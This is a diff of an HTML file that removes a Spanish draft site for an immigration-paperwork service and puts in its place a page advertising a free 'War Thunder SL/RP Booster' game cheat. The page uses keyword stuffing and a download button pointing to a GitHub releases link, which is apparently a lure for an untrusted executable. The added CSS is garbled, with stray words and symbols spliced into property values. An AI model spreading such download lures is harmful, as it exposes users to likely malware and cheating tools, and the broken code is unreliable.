@@ -1,1389 +1,317 @@
-<!doctype html>
-<html lang="es">
+```html
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Borrador del sitio</title>
-<meta name="robots" content="noindex, nofollow">
-<meta name="theme-color" content="#faf8f4">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Spectral:wght@400;600&display=swap">
-<style>
-/* {{MARCA}} — sistema visual "Expediente"
-   Paleta de documento jurídico, tipografía de display en titulares y precio.
-   Mobile-first. Cero peticiones fuera del dominio propio: las tipografías se
-   sirven desde /estaticos/fuentes/
-   El sitio es SOLO claro. No hay tokens oscuros ni prefers-color-scheme: el
-   acento burdeos no sobrevive a un fondo oscuro sin cambiar de tono.
-
-   Escala de espaciado, en múltiplos de 4 px: .5rem=8 · .75rem=12 · 1rem=16 ·
-   1.5rem=24 · 2rem=32 · 3rem=48.
-   Instrument Serif NUNCA por debajo de 1.25rem: es de alto contraste y sus
-   trazos finos se rompen en pantallas de gama baja. */
-
-/* Subconjunto latino. Source Sans 3 es una fuente variable: un solo archivo
-   cubre todo el eje de pesos, por eso se declara con rango 400–600 y no con
-   dos ficheros. */
-
-
-
-:root {
-  color-scheme: light;
-
-  --papel:      #faf8f4;
-  --papel-alt:  #f3efe7;
-  --tinta:      #1a1815;
-  --tinta-tenue:#5c554b;
-  --acento:     #6b2131;
-  --acento-alt: #4e1724;
-  --linea:      #e3dcd0;
-  --aviso:      #7a4a00;
-  --aviso-fondo:#f7edd8;
-
-  --display: "Instrument Serif", Georgia, "Times New Roman", serif;
-  --texto:   "Source Sans 3", "Segoe UI", system-ui, -apple-system, sans-serif;
-
-  --ancho: 40rem;
-  --radio: 0;
-  /* Peso de los titulares. Una serifa de display aguanta en 400; una serifa de
-     texto como Spectral necesita 600 o los titulares pesan menos que el cuerpo. */
-  --peso-titular: 400;
-  /* La cifra del precio puede llevar un acento propio, distinto del general. */
-  --acento-cifra: var(--acento);
-}
-
-*, *::before, *::after { box-sizing: border-box; }
-
-html { -webkit-text-size-adjust: 100%; }
-
-body {
-  margin: 0;
-  padding: 0;
-  font-family: var(--texto);
-  font-size: 1.0625rem;
-  line-height: 1.65;
-  color: var(--tinta);
-  background: var(--papel);
-  overflow-wrap: break-word;
-}
-
-.envoltura { width: 100%; max-width: var(--ancho); margin: 0 auto; padding: 0 1rem; }
-
-/* --- Cabecera, navegación y pie --------------------------------------------- */
-
-header.sitio { border-bottom: 1px solid var(--linea); padding: 1rem 0; }
-header.sitio .envoltura { display: flex; align-items: baseline; gap: 0.75rem; flex-wrap: wrap; }
-
-.marca {
-  font-family: var(--display); font-weight: var(--peso-titular); font-size: 1.35rem;
-  line-height: 1.1; color: var(--tinta); text-decoration: none;
-}
-.marca span {
-  display: block; font-family: var(--texto); font-size: 0.78rem;
-  line-height: 1.4; color: var(--tinta-tenue);
-}
-
-nav.sitio { border-bottom: 1px solid var(--linea); background: var(--papel-alt); }
-nav.sitio ul {
-  list-style: none; margin: 0 auto; padding: 0.5rem 1rem;
-  display: flex; flex-wrap: wrap; gap: 0.25rem 1rem;
-  max-width: var(--ancho); font-size: 0.9rem;
-}
-nav.sitio a { color: var(--tinta-tenue); text-decoration: none; }
-nav.sitio a:hover, nav.sitio a[aria-current="page"] { color: var(--acento); text-decoration: underline; }
-
-main { padding: 1.5rem 0 2.5rem; }
-
-/* Pie oscuro. Ancla la pagina y separa el contenido de lo administrativo. Los
-   datos de identificacion NO viven aqui: viven en el aviso legal, a un clic. */
-footer.sitio {
-  background: var(--tinta);
-  color: var(--papel-alt);
-  padding: 2.5rem 0 2rem;
-  font-size: 0.9rem;
-}
-footer.sitio a { color: var(--papel-alt); text-decoration: none; }
-footer.sitio a:hover { color: var(--papel); text-decoration: underline; }
-footer.sitio .tenue { color: rgba(250, 248, 244, 0.62); }
-
-.pie-columnas { display: grid; gap: 1.75rem; }
-.pie-columnas ul { list-style: none; margin: 0; padding: 0; }
-.pie-columnas li { margin-bottom: 0.4rem; }
-.pie-columnas p { margin: 0 0 0.5rem; }
-.pie-titulo {
-  font-family: var(--texto); font-weight: 600; font-size: 0.72rem;
-  letter-spacing: 0.14em; text-transform: uppercase;
-  color: rgba(250, 248, 244, 0.55);
-}
-
-.pie-cierre {
-  margin: 2rem 0 0; padding-top: 1.25rem;
-  border-top: 1px solid rgba(250, 248, 244, 0.16);
-  font-size: 0.78rem; line-height: 1.6;
-  color: rgba(250, 248, 244, 0.62);
-}
-
-/* --- Texto ------------------------------------------------------------------ */
-
-h1 {
-  font-family: var(--display); font-weight: var(--peso-titular);
-  font-size: 2rem; line-height: 1.08; letter-spacing: 0;
-  margin: 0 0 0.75rem;
-}
-h2 {
-  font-family: var(--display); font-weight: var(--peso-titular);
-  font-size: 1.4rem; line-height: 1.15;
-  margin: 2rem 0 0.5rem;
-}
-h3 { font-family: var(--texto); font-weight: 600; font-size: 1rem; margin: 1.5rem 0 0.25rem; }
-
-p { margin: 0 0 1rem; }
-
-.entradilla { font-size: 1.12rem; color: var(--tinta-tenue); margin: 0 0 1.5rem; }
-
-/* Antetitulo: dice de que familia es el tramite antes de que el lector lea el
-   titular. Orienta sin ocupar sitio. */
-.antetitulo {
-  font-family: var(--texto); font-weight: 600; font-size: 0.72rem;
-  letter-spacing: 0.16em; text-transform: uppercase;
-  color: var(--tinta-tenue); margin: 0 0 0.5rem;
-}
-
-/* Cita destacada. Donde un despacho grande pone un premio o un ranking, aqui va
-   un dato de la norma que el cliente no conoce. Es la misma funcion: demostrar
-   que se sabe de esto, con lo unico que tenemos para demostrarlo. */
-.destacado {
-  border-top: 2px solid var(--tinta); border-bottom: 1px solid var(--linea);
-  padding: 1.25rem 0; margin: 2rem 0;
-}
-.destacado p {
-  font-family: var(--display); font-weight: var(--peso-titular);
-  font-size: 1.35rem; line-height: 1.3; margin: 0 0 0.5rem;
-}
-/* Llamada a la accion a media pagina. Los requisitos son el momento en que el
-   lector decide si es su caso; ahi es donde tiene la pregunta. */
-.cta-intermedio {
-  background: var(--papel-alt); border-left: 3px solid var(--acento);
-  padding: 1.25rem; margin: 2rem 0;
-}
-.cta-intermedio p { margin: 0 0 1rem; font-size: 0.98rem; }
-.cta-intermedio .boton { display: inline-block; }
-
-.destacado .fuente {
-  font-family: var(--texto); font-size: 0.78rem; letter-spacing: 0.08em;
-  text-transform: uppercase; color: var(--tinta-tenue); margin: 0;
-}
-.tenue { color: var(--tinta-tenue); font-size: 0.9rem; }
-
-a { color: var(--acento); text-decoration: underline; text-underline-offset: 2px; }
-a:hover { color: var(--acento-alt); }
-
-/* --- Listas ------------------------------------------------------------------ */
-
-ul.lista, ol.lista { margin: 0 0 1.5rem; }
-ul.lista { list-style: none; padding-left: 0; }
-ul.lista li { padding-left: 1rem; position: relative; margin-bottom: 0.5rem; }
-ul.lista li::before { content: "\2014"; position: absolute; left: 0; color: var(--acento); }
-ol.lista { padding-left: 1.25rem; }
-ol.lista li { margin-bottom: 0.5rem; }
-
-.si-no { list-style: none; margin: 0 0 1.5rem; padding: 0; }
-.si-no li { padding-left: 1.25rem; position: relative; margin-bottom: 0.5rem; }
-.si-no li::before { position: absolute; left: 0; font-weight: 600; }
-.si-no li.si::before { content: "+"; color: var(--acento); }
-.si-no li.no::before { content: "\2013"; color: var(--tinta-tenue); }
-
-/* --- Bloques ----------------------------------------------------------------- */
-
-.tarjeta {
-  border: 1px solid var(--linea);
-  border-radius: var(--radio);
-  padding: 1rem;
-  margin: 0 0 1.5rem;
-  background: var(--papel-alt);
-}
-.tarjeta h2, .tarjeta h3 { margin-top: 0; }
-.tarjeta p:last-child { margin-bottom: 0; }
-
-.precio {
-  display: flex; flex-wrap: wrap; align-items: baseline; gap: 0.5rem 1rem;
-  border-top: 2px solid var(--tinta); border-bottom: 2px solid var(--tinta);
-  padding: 0.75rem 0; margin: 0 0 1rem; background: none;
-}
-.precio strong {
-  font-family: var(--display); font-weight: var(--peso-titular);
-  font-size: 2.15rem; line-height: 1;
-  color: var(--acento-cifra); font-variant-numeric: tabular-nums;
-}
-.precio .plazo { color: var(--tinta-tenue); font-size: 0.9rem; }
-
-.limite { border-left: 2px solid var(--acento); padding-left: 1rem; margin: 1.5rem 0; }
-.limite p:last-child { margin-bottom: 0; }
-
-.aviso-verificacion {
-  border: 2px dashed var(--aviso);
-  background: var(--aviso-fondo);
-  color: var(--aviso);
-  border-radius: var(--radio);
-  padding: 0.75rem 1rem;
-  margin: 0 0 1.5rem;
-  font-size: 0.92rem;
-}
-.aviso-verificacion strong { display: block; margin-bottom: 0.25rem; }
-
-details { border-bottom: 1px solid var(--linea); padding: 0.75rem 0; }
-details summary { font-family: var(--texto); font-weight: 600; cursor: pointer; }
-details p { margin: 0.5rem 0 0.25rem; }
-
-hr { border: 0; border-top: 1px solid var(--linea); margin: 2rem 0; }
-
-/* --- Llamadas a la acción ----------------------------------------------------- */
-
-.acciones { display: flex; flex-direction: column; gap: 0.75rem; margin: 1.5rem 0; }
-
-.boton {
-  display: block;
-  text-align: center;
-  padding: 0.75rem 1rem;
-  border-radius: var(--radio);
-  text-decoration: none;
-  font-family: var(--texto);
-  font-weight: 600;
-  font-size: 1rem;
-  border: 1px solid var(--acento);
-  color: var(--acento);
-  background: transparent;
-  cursor: pointer;
-}
-.boton.principal { background: var(--acento); color: var(--papel); }
-.boton:hover { border-color: var(--acento-alt); color: var(--acento-alt); }
-.boton.principal:hover { background: var(--acento-alt); color: var(--papel); }
-
-/* --- Formulario --------------------------------------------------------------- */
-
-form.contacto { margin: 1.5rem 0; }
-form.contacto p { margin: 0 0 1rem; }
-form.contacto label { display: block; font-weight: 600; margin-bottom: 0.25rem; font-size: 0.95rem; }
-form.contacto .ayuda {
-  display: block; font-weight: 400; color: var(--tinta-tenue);
-  font-size: 0.85rem; margin-top: 0.25rem;
-}
-form.contacto input[type="text"],
-form.contacto input[type="tel"],
-form.contacto input[type="email"],
-form.contacto textarea,
-form.contacto select {
-  width: 100%;
-  padding: 0.75rem;
-  font: inherit;
-  font-size: 1rem;
-  color: var(--tinta);
-  background: var(--papel);
-  border: 1px solid var(--linea);
-  border-radius: var(--radio);
-}
-form.contacto .consentimiento { display: flex; gap: 0.75rem; align-items: flex-start; font-size: 0.92rem; }
-form.contacto .consentimiento input { margin-top: 0.25rem; flex: none; }
-form.contacto .consentimiento label { font-weight: 400; }
-
-.trampa { position: absolute; left: -9999px; width: 1px; height: 1px; overflow: hidden; }
-
-/* Foco visible. La declaración necesita la palabra `solid`: sin ella se descarta
-   entera y el sitio se queda sin indicador de foco. */
-input:focus-visible, select:focus-visible, textarea:focus-visible,
-a:focus-visible, .boton:focus-visible, summary:focus-visible, button:focus-visible {
-  outline: 2px solid var(--acento);
-  outline-offset: 2px;
-}
-
-/* --- Tablas -------------------------------------------------------------------- */
-
-.tabla-envoltura { overflow-x: auto; margin: 0 0 1.5rem; }
-table { border-collapse: collapse; width: 100%; font-size: 0.95rem; }
-caption { text-align: left; color: var(--tinta-tenue); font-size: 0.86rem; padding-bottom: 0.5rem; }
-th, td { text-align: left; padding: 0.75rem 0.75rem 0.75rem 0; border-bottom: 1px solid var(--linea); vertical-align: top; }
-th { font-weight: 600; }
-th[colspan] { font-family: var(--display); font-weight: var(--peso-titular); font-size: 1.25rem; padding-top: 1.5rem; }
-td.cifra {
-  white-space: nowrap; font-family: var(--display); font-size: 1.5rem;
-  color: var(--acento-cifra); font-variant-numeric: tabular-nums;
-}
-
-/* --- Maqueta de dos columnas -------------------------------------------------- */
-
-/* En móvil es una sola columna, y el bloque de precio sube justo debajo de la
-   entradilla: el precio publicado es la ventaja competitiva y no se entierra al
-   final de la página. En escritorio pasa a una barra lateral fija. */
-.dos-columnas { display: flex; flex-direction: column; }
-.columna-lateral { order: -1; margin-bottom: 1.5rem; }
-
-.ficha-precio { border-top: 2px solid var(--tinta); border-bottom: 1px solid var(--linea);
-                padding: 1rem 0; }
-.ficha-precio .precio { border: 0; padding: 0; margin: 0 0 0.25rem; }
-.ficha-precio .etiqueta { display: block; font-family: var(--texto); font-size: 0.7rem;
-                          font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase;
-                          color: var(--tinta-tenue); margin-bottom: 0.5rem; }
-.plazo-suelto { font-size: 0.9rem; color: var(--tinta-tenue); margin: 0 0 1rem; }
-.ficha-precio .tenue { display: block; margin-top: 1rem; font-size: 0.82rem; }
-
-.contacto-cabecera { display: none; }
-.boton-cabecera { padding: 0.5rem 1.25rem; font-size: 0.9rem; }
-
-/* --- Contacto permanente ------------------------------------------------------- */
-
-.barra-contacto {
-  position: fixed; left: 0; right: 0; bottom: 0; z-index: 30;
-  background: var(--papel-alt); border-top: 2px solid var(--acento);
-  padding: 0.6rem 0;
-}
-.barra-contacto .envoltura { display: flex; align-items: center; }
-.botones-fijos { display: flex; gap: 0.5rem; flex: 1; }
-.botones-fijos .boton {
-  flex: 1; padding: 0.7rem 0.5rem; font-size: 0.98rem;
-  display: flex; align-items: center; justify-content: center; gap: 0.5rem;
-}
-.boton .ico { flex: none; }
-
-/* Hueco al final para que la barra no tape el pie. */
-body { padding-bottom: 4.25rem; }
-.rejilla-tramites ul.lista { margin-bottom: 0.75rem; }
-
-/* --- Escritorio ----------------------------------------------------------------- */
-
-@media (min-width: 40rem) {
-  body { font-size: 1.09rem; }
-  h1 { font-size: 2.75rem; line-height: 1.05; }
-  h2 { font-size: 1.6rem; }
-  main { padding: 2.5rem 0 3.5rem; }
-  .precio strong { font-size: 2.6rem; }
-  .acciones { flex-direction: row; }
-  .acciones .boton { flex: 1; }
-}
-
-/* A partir de aquí hay sitio de sobra y se deja de servir la versión de móvil
-   estirada por el centro: la página se ensancha, pero la MEDIDA DE LECTURA no.
-   El texto largo sigue a 38rem porque leer líneas de mil píxeles es incómodo;
-   lo que se ensancha es la página, no el párrafo. */
-@media (min-width: 64rem) {
-  .envoltura { max-width: 66rem; padding: 0 2rem; }
-
-  main .envoltura > * { max-width: 38rem; }
-  main .envoltura > .dos-columnas,
-  main .envoltura > .rejilla-tramites,
-  main .envoltura > .tabla-envoltura { max-width: none; }
-
-  header.sitio .envoltura { justify-content: space-between; align-items: flex-start; }
-  header.sitio { padding: 1.5rem 0; }
-  .marca { font-size: 1.6rem; }
-  .contacto-cabecera { display: flex; align-items: center; gap: 1rem; }
-  .contacto-cabecera p { margin: 0; font-size: 0.82rem; }
-
-  .dos-columnas {
-    display: grid;
-    grid-template-columns: minmax(0, 38rem) 19rem;
-    gap: 3rem;
-    align-items: start;
-  }
-  .columna-principal { min-width: 0; }
-  .columna-principal > h2:first-child { margin-top: 0; }
-  .columna-lateral { order: 0; margin-bottom: 0; position: sticky; top: 2rem; }
-
-  .ficha-precio {
-    border: 1px solid var(--linea);
-    border-top: 3px solid var(--tinta);
-    background: var(--papel-alt);
-    padding: 1.25rem;
-  }
-  .ficha-precio .acciones { flex-direction: column; margin: 1rem 0 0; }
-
-  .rejilla-tramites { display: grid; grid-template-columns: 1fr 1fr; gap: 0 3rem; }
-  .rejilla-tramites > p { grid-column: 1 / -1; margin-top: 0.5rem; }
-
-  ol.lista.pasos { columns: 2; column-gap: 3rem; }
-  ol.lista.pasos li { break-inside: avoid; }
-
-  /* El catalogo de tramites y la tabla de precios si aprovechan el ancho: son
-     listas y datos, no prosa. El texto legal se queda en una columna estrecha
-     porque leer lineas de mil pixeles es incomodo, no porque falte sitio. */
-  main .envoltura > .catalogo { max-width: none; columns: 2; column-gap: 3.5rem; }
-  .catalogo h2 { margin-top: 0; break-after: avoid; }
-  .catalogo h2 + ul { break-before: avoid; }
-  .catalogo ul.lista { break-inside: avoid; }
-
-  .pie-columnas { grid-template-columns: 1.4fr 1fr 1.2fr 1fr; gap: 0 2.5rem; }
-
-  .barra-contacto .envoltura { justify-content: flex-end; }
-  .botones-fijos { flex: 0 0 auto; }
-  .botones-fijos .boton { flex: 0 0 auto; padding: 0.6rem 1.4rem; }
-  body { padding-bottom: 4.75rem; }
-}
-
-@media (prefers-reduced-motion: reduce) {
-  * { animation: none !important; transition: none !important; }
-}
-
-
-.pendiente{background:#f7edd8;color:#7a4a00;padding:0 .25em;border-bottom:1px dotted #7a4a00;
-  font-family:ui-monospace,Consolas,monospace;font-size:.9em;white-space:nowrap;}
-.hueco{background:#f7edd8;color:#7a4a00;padding:0 .25em;border-bottom:1px dotted #7a4a00;
-  font-size:.92em;font-style:italic;}
-.chip-borrador{display:inline-block;background:#f7edd8;color:#7a4a00;border:1px solid #7a4a00;
-  padding:.1rem .5rem;font-size:.7rem;font-weight:600;letter-spacing:.1em;
-  text-transform:uppercase;margin:0 0 1rem;}
-[hidden]{display:none!important;}
-
-.selector{background:#14171c;color:#e9ecf1;padding:.6rem 1rem;position:sticky;top:0;z-index:20;
-  font:400 15px/1.5 -apple-system,"Segoe UI",system-ui,sans-serif;}
-.selector .env{max-width:44rem;margin:0 auto;}
-.selector b{display:block;font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;
-  color:#9aa4b2;margin-bottom:.45rem;}
-.selector .botones{display:flex;flex-wrap:wrap;gap:.4rem;}
-.selector button{font:inherit;font-size:.82rem;font-weight:600;padding:.4rem .7rem;
-  border:1px solid #38414d;background:transparent;color:#e9ecf1;border-radius:3px;cursor:pointer;}
-.selector button:hover{border-color:#6f7d8f;}
-.selector button[aria-pressed="true"]{background:#e9ecf1;color:#14171c;border-color:#e9ecf1;}
-
-:root[data-tema="1"] { --papel: #faf8f4; --papel-alt: #f3efe7; --tinta: #1a1815; --tinta-tenue: #5c554b; --linea: #e3dcd0; --radio: 0; --display: Spectral, Georgia, "Times New Roman", serif; --texto: Spectral, Georgia, "Times New Roman", serif; --peso-titular: 600; --acento: #6b2131; --acento-alt: #4e1724; --acento-cifra: #6b2131; }
-:root[data-tema="2"] { --papel: #faf8f4; --papel-alt: #f3efe7; --tinta: #1a1815; --tinta-tenue: #5c554b; --linea: #e3dcd0; --radio: 0; --display: Spectral, Georgia, "Times New Roman", serif; --texto: Spectral, Georgia, "Times New Roman", serif; --peso-titular: 600; --acento: #0f4436; --acento-alt: #0a3128; --acento-cifra: #0f4436; }
-:root[data-tema="3"] { --papel: #faf8f4; --papel-alt: #f3efe7; --tinta: #1a1815; --tinta-tenue: #5c554b; --linea: #e3dcd0; --radio: 0; --display: Spectral, Georgia, "Times New Roman", serif; --texto: Spectral, Georgia, "Times New Roman", serif; --peso-titular: 600; --acento: #0f4436; --acento-alt: #0a3128; --acento-cifra: #6b2131; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>War-Thunder-SL-RP-Booster - Boost Your Silver Lions & RP for Free (2026)</title>
+    <meta name="description" content="Download War Thunder SL RP Booster — free, working, updated for 2026. Automatically boost Silver Lions, Research Points, and Crew XP effortlessly. Get more RP and SL in War Thunder without tedious grinding.">
+    <meta name="keywords" content="war-thunder-afk-farm,war-thunder-auto-grind,war-thunder-auto-play,war-thunder-booster-hack,war-thunder-crew-xp-hack,war-thunder-grind-hack,war-thunder-research-hack,war-thunder-rp-booster,war-thunder-rp-hack,war-thunder-rp-multiplier,war-thunder-silver-lions-hack,war-thunder-silver-lions-mod,war-thunder-sl-booster,war-thunder-sl-booster-2025,war-thunder-sl-rp-booster,warthunder-rp-booster-free,warthunder-sl-booster-download,warthunder-sl-hack,warthunder-sl-hack-free,warthunder-sl-rp-booster-free-download">
+    <meta name="author" content="SLRP Team">
+    <meta property="og:title" content="War-Thunder-SL-RP-Booster - Free SL & RP Multiplier Tool (2026)">
+    <meta property="og:description" content="Get free Silver Lions and Research Points boost. Automatically grind RP and SL while AFK. Updated for 2026 – download now!">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases">
+    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🚀</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+            color: #e2e8f0;
+            line-height: 1.6;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            border:  ️1px solid rgba(255, 255, 255, 0.1);
+        }
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, #f59e0b, #fbbf24);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            text-align: center;
+            font-size:@@ 1.2rem;
+            color: #94a3b8;
+            margin-bottom:@@ 2.5rem;
+            font-weight:@@ 400;
+        }
+        .download-hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: warranted 1.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius:  ️16px;
+            padding: 2rem 1.5rem;
+            margin-bottom:imated 2.5rem;
+            border:  ️1px solid rgba(255, 255, 255, 0.08);
+        }
+        .btn-download {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, #f97316, #fbbf24);
+            color: #0f172a;
+            font-weight: 700;
+            font-size: 1.4rem;
+            padding: 1rem 2.5rem;
+            border-radius:  ️50px;
+            text-decoration: none;
+            box-shadow: 0 12px 25px -5px rgba(249, 115, 22, 0.6);
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            animation: pulse 2s infinite;
+        }
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 18px 30px -5px rgba(249, 115, 22, 0.8);
+            background: linear-gradient(135deg, #ea580c, #f59e0b);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .link-note {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+            background: rgba(0, 0, 0, 0.3);
+            padding:  ️0.5rem 1rem;
+            border-radius:  ️30px;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-top: satisfied 2.5rem;
+            margin-bottom: 1rem;
+            color: #f1f5f9;
+            border-left:  ️5px solid #f97316;
+            padding-left: disciplined 1rem;
+        }
+        h3 {
+            font-size:À 1.3rem;
+            font-weight: deep 600;
+            margin-top: satified 1.5rem;
+            margin-bottom: accomplishment 0.5rem;
+            color: #fbbf24;
+        }
+        p, li {
+            font-size: besides 1.1rem;
+            color: #cbd5e1;
+        }
+        ul, ol {
+            padding-left: emp 1.5rem;
+            margin-bottom: accomplished 1.5rem;
+        }
+        li {
+            margin-bottom: just 0.5rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: just 1rem;
+            margin:ust 1rem 0;
+        }
+        .feature-card {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: employed 12px;
+            padding: similar 1.2rem;
+            border-left:em she 4px solid #f97316;
+        }
+        .feature-card strong {
+            color: #fbbf24;
+            font-size: instanceof 1.1rem;
+        }
+        .steps-container {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: auto 16px;
+            padding: rightful 1.5rem;
+        }
+        code {
+            background: requisitely rgba(255, 255, 255, 0.15);
+            padding: lexeme 0.2rem 0.5rem;
+            border-radius: presiding 6px;
+            font-family: 'Cascadia Code', Consolas, monospace;
+            font-size: substantially  ️0.9em;
+            color: #fde68a;
+        }
+        .badge-container {
+            display: flex;
+            justify-content: window center;
+            gap: product's 0.8rem;
+            flex-wrap: wrap;
+            margin-top: justifiably 2rem;
+        }
+        .badge {
+            background: elegant rgba(59, 130, 246,  ️0.2);
+            padding: the 0.4rem 1rem;
+            border-radius: eventual 30px;
+            font-size: soon 0.85rem;
+            color: #93c5fd;
+            border: anyway 1px solid rgba(59, 130,, 246,, 0.3);
+            text-transform: unquestionably uppercase;
+            letter-spacing:26px;
+        }
+        footer {
+            margin-top:iquity 3rem;
+            text-align: only center;
+            font-size:s physical 0.9rem;
+            color:#64748b;
+        }
+        .separator {
+            height: some shell 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            margin: exceptionally  ️2.5rem 0;
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: rank 1.8rem;
+            }
+            .container {
+                padding: ashing 1.5rem;
+            }
+            .btn-download {
+                font-size: imminent  ️1.1rem;
+                padding: practical 0.8rem 1.8rem;
+                width: respectfully 100%;
+                text-align: inexplicably center;
+            }
+            .link-note {
+                font-size: saleforce 0.95rem;
+                padding: cross 0.3rem 0.8rem;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="selector"><div class="env"><b>Elija un diseño</b><div class="botones"><button type="button" data-ir="1">1. Burdeos</button><button type="button" data-ir="2">2. Verde botella</button><button type="button" data-ir="3">3. Verde y burdeos</button></div></div></div>
-<header class="sitio">
-  <div class="envoltura">
-    <a class="marca" href="#inicio"><span class="pendiente">MARCA pendiente</span><span>Asesoría jurídica · Extranjería · Gipuzkoa</span></a>
-    <div class="contacto-cabecera">
-      <p class="tenue"><span class="pendiente">WHATSAPP_VISIBLE pendiente</span> · Donostia-San Sebastián</p>
-      <a class="boton principal boton-cabecera" href="#contacto">Contacto</a>
-    </div>
-  </div>
-</header>
-
-<nav class="sitio" aria-label="Principal">
-  <ul><li><a href="#inicio" aria-current="page">Inicio</a></li><li><a href="#prorroga-regularizacion-2026">Regularización 2026</a></li><li><a href="#tramites">Trámites</a></li><li><a href="#precios">Precios</a></li><li><a href="#contacto">Contacto</a></li></ul>
-</nav>
-<main>
-<section class="pagina" id="inicio" hidden>
-  <div class="envoltura">
-
-<!-- Home. Regla del brief: que se hace, para quien, y contacto visible sin hacer scroll.
-     Las paginas de servicio son las que posicionan; esta orienta y deriva.
-     Misma anatomia que la ficha de servicio: contenido a la izquierda y, en escritorio,
-     una columna fija a la derecha con el contacto siempre a la vista. -->
-
-    <h1>Trámites de extranjería en Donostia-San Sebastián y Gipuzkoa</h1>
-    <p class="entradilla">Preparamos y presentamos su expediente en vía administrativa, con precio cerrado publicado y control de plazos. Sin desplazamientos si no los quiere.</p>
-
-    <div class="dos-columnas">
-      <div class="columna-principal">
-
-        <h2>Qué hacemos</h2>
-    <p>Nos ocupamos de la parte administrativa de su situación: revisar si su caso encaja en una figura concreta, reunir y comprobar la documentación, presentar el expediente y vigilar los plazos hasta la resolución.</p>
-    <p>Trabajamos sobre el reglamento de extranjería vigente desde 2025 y su modificación de 2026.</p>
-    <p>Atendemos en castellano. La consulta puede ser por WhatsApp, por teléfono o presencial en Donostia si lo prefiere.</p>
-
-        <h2>Trámites</h2>
-        <div class="rejilla-tramites">
-    <ul class="lista">
-      <li><a href="#prorroga-regularizacion-2026">Prórroga o modificación de la regularización de 2026</a> — 420 €. Si consiguió la autorización extraordinaria en 2026, le vence al año.</li>
-      <li><a href="#arraigo-segunda-oportunidad">Arraigo de segunda oportunidad</a> — 425 €. Si tuvo papeles en los últimos dos años y los perdió porque no pudo renovar, esta figura se creó para usted.</li>
-    </ul>
-    <p>Cubrimos además el resto de figuras de arraigo, familiar de español y reagrupación familiar, residencia y trabajo, estudios, renovaciones, TIE y NIE, recursos tras una denegación y nacionalidad por residencia. <a href="#tramites">Ver todos los trámites</a>.</p>
+    <div class="container">
+        <h1>⚡ War-Thunder-SL-RP-Booster - Boost Silver Lions & RP Instantly</h1>
+        <p class="subtitle">Free, working, and updated for 2026. Zero grinding required.</p>
+        
+        <div class="download-hero">
+            <a href="https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases" class="btn-download">⬇️ DOWNLOAD WAR-THUNDER BOOSTER</a>
+            <span class="link-note">🔗 Visit this link to download the application.</span>
         </div>
 
-        <h2>Cómo funciona</h2>
-        <ol class="lista pasos">
-      <li>Nos escribe una frase con su situación. Le decimos si encaja en alguna figura y cuál. Esto no se cobra.</li>
-      <li>Si encaja, le pasamos el precio cerrado y la lista exacta de documentos. Usted decide.</li>
-      <li>Reunimos y revisamos la documentación. Si falta algo, se lo decimos antes de presentar, no después.</li>
-      <li>Presentamos el expediente y le avisamos de cada plazo y de cada requerimiento hasta la resolución.</li>
-        </ol>
+        <h2>🚀 What Is This?</h2>
+        <p>War-Thunder-SL-RP-Booster is an automatic booster tool designed solely for War Thunder. It dramatically increases your <strong>Silver Lions (SL)</strong> and <strong>Research Points (RP)</strong> earnings, so you can unlock new vehicles, upgrades,and modifications without spending hours grinding. Whether you are researching a top-tier jet or accumulating millions of SL, this utility streamlines the entire process and sets your progress on hyperdrive.</p>
 
-        <h2>El límite de este servicio</h2>
-        <div class="limite">
-          <p>Este servicio consiste en asesoramiento y tramitación en vía administrativa, no
-             incluye representación ni defensa procesal. Si su asunto pasa a vía judicial, se le
-             informa y se le propone la derivación a un profesional colegiado.</p>
